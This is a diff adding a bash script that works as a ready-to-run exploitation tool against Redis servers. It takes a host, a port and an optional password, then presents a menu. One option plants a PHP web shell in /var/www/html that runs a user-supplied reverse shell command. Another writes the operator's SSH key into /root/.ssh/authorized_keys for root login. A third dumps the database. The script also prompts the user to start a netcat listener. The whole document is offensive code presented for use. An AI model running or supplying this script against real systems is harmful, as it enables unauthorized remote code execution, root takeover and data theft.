@@ -1,0 +1,119 @@
+#!/bin/bash
+
+# Function to display the help menu
+function show_help() {
+  echo -e "\nUsage: $0 <host> <port> [password]"
+  echo -e "If no password is provided, the script assumes no authentication is required.\n"
+  exit 1
+}
+
+# Check if at least host and port are provided
+if [ $# -lt 2 ]; then
+  show_help
+fi
+
+HOST=$1
+PORT=$2
+PASSWORD=${3:-""}
+
+# Connect to Redis
+function connect_to_redis() {
+  echo "Testing Redis connection on $HOST:$PORT..."
+  if [ -z "$PASSWORD" ]; then
+    redis-cli -h $HOST -p $PORT PING > /dev/null 2>&1
+  else
+    redis-cli -h $HOST -p $PORT -a $PASSWORD PING > /dev/null 2>&1
+  fi
+
+  if [ $? -eq 0 ]; then
+    echo "Connection successful!"
+  else
+    echo "Failed to connect to Redis on $HOST:$PORT. Exiting."
+    exit 1
+  fi
+}
+
+# Check if nc listener is active
+function wait_for_nc_listener() {
+  local port=$1
+  echo "Waiting for Netcat listener on port $port..."
+  while true; do
+    if netstat -an | grep -q ":$port .*LISTEN"; then
+      echo "Netcat listener detected on port $port. Proceeding..."
+      break
+    fi
+    echo "No listener found on port $port. Please start it (nc -lvnp $port)..."
+    sleep 5
+  done
+}
+
+# Inject a web shell with user-specified command
+function inject_user_shell() {
+  echo "Injecting a custom web shell..."
+  SHELL_DIR="/var/www/html"
+  SHELL_FILENAME="customshell.php"
+
+  echo "Enter the shell command you want to execute in the web shell (e.g., reverse shell payload):"
+  read -p "Enter the Reverse Shell Command here: " SHELL_PAYLOAD
+
+  if [ -z "$SHELL_PAYLOAD" ]; then
+    echo "No payload provided. Exiting."
+    exit 1
+  fi
+
+  echo "Using the following payload:"
+  echo "<?php system(\"$SHELL_PAYLOAD\"); ?>"
+
+  if [ -z "$PASSWORD" ]; then
+    redis-cli -h $HOST -p $PORT CONFIG SET dir $SHELL_DIR
+    redis-cli -h $HOST -p $PORT CONFIG SET dbfilename $SHELL_FILENAME
+    echo -en "<?php system(\"$SHELL_PAYLOAD\"); ?>" | redis-cli -h $HOST -p $PORT -x SET customshell
+    redis-cli -h $HOST -p $PORT SAVE
+  else
+    redis-cli -h $HOST -p $PORT -a $PASSWORD CONFIG SET dir $SHELL_DIR
+    redis-cli -h $HOST -p $PORT -a $PASSWORD CONFIG SET dbfilename $SHELL_FILENAME
+    echo -en "<?php system(\"$SHELL_PAYLOAD\"); ?>" | redis-cli -h $HOST -p $PORT -a $PASSWORD -x SET customshell
+    redis-cli -h $HOST -p $PORT -a $PASSWORD SAVE
+  fi
+
+  echo "Web shell injected! Access it at: http://$HOST/$SHELL_FILENAME"
+}
+
+# Main menu
+connect_to_redis
+echo -e "\nConnected to Redis. Select an action:"
+echo "1. Inject a custom PHP web shell"
+echo "2. Dump the database to disk"
+echo "3. Inject an SSH key for root access"
+read -p "Enter your choice: " choice
+
+case $choice in
+  1) inject_user_shell ;;
+  2)
+    echo "Dumping the database..."
+    if [ -z "$PASSWORD" ]; then
+      redis-cli -h $HOST -p $PORT SAVE
+      echo "Database dumped. Fetch it from the Redis directory."
+    else
+      redis-cli -h $HOST -p $PORT -a $PASSWORD SAVE
+      echo "Database dumped. Fetch it from the Redis directory."
+    fi
+    ;;
+  3)
+    echo "Injecting SSH key for root access..."
+    SSH_KEY=$(cat ~/.ssh/id_rsa.pub)
+    if [ -z "$PASSWORD" ]; then
+      echo -e "\n\n\n\n$SSH_KEY" | redis-cli -h $HOST -p $PORT -x SET ssh_key
+      redis-cli -h $HOST -p $PORT CONFIG SET dir /root/.ssh/
+      redis-cli -h $HOST -p $PORT CONFIG SET dbfilename authorized_keys
+      redis-cli -h $HOST -p $PORT SAVE
+    else
+      echo -e "\n\n\n\n$SSH_KEY" | redis-cli -h $HOST -p $PORT -a $PASSWORD -x SET ssh_key
+      redis-cli -h $HOST -p $PORT -a $PASSWORD CONFIG SET dir /root/.ssh/
+      redis-cli -h $HOST -p $PORT -a $PASSWORD CONFIG SET dbfilename authorized_keys
+      redis-cli -h $HOST -p $PORT -a $PASSWORD SAVE
+    fi
+    echo "SSH key injected! Try logging in: ssh root@$HOST"
+    ;;
+  *) echo "Invalid choice. Exiting." ;;
+esac
